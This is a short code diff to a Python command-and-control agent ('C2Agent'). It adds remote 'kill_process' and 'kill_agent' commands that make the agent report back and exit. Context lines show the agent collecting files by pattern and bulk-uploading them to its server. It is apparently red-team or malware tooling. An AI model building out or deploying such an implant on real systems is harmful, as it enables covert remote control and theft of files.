@@ -16,6 +16,7 @@ import uuid
 import base64
 import glob
 from datetime import datetime
+import sys
 
 class C2Agent:
     def __init__(self, server_url="http://localhost:3002"):
@@ -327,6 +328,22 @@ class C2Agent:
             pattern = parts[0].strip()
             max_files = int(parts[1].strip()) if len(parts) > 1 else 10
             return self.collect_files_by_pattern(pattern, max_files)
+        elif command_type == 'kill_process':
+            # Kill the current process
+            return {
+                'success': True,
+                'output': 'Process termination initiated',
+                'error': '',
+                'return_code': 0
+            }
+        elif command_type == 'kill_agent':
+            # Mark agent as compromised and terminate
+            return {
+                'success': True,
+                'output': 'Agent termination initiated',
+                'error': '',
+                'return_code': 0
+            }
         else:
             return {
                 'success': False,
@@ -411,6 +428,14 @@ class C2Agent:
                                     'data': file_info['data']
                                 })
                             self.bulk_upload(files=file_data)
+                    
+                    # Handle kill commands
+                    elif command['command_type'] in ['kill_process', 'kill_agent']:
+                        # Submit the result first
+                        self.submit_result(command['id'], result)
+                        print(f"[*] {result.get('output', 'Termination initiated')}")
+                        time.sleep(1)  # Give time for result submission
+                        sys.exit(0)  # Terminate the agent
                     
                     # Submit the result
                     self.submit_result(command['id'], result)
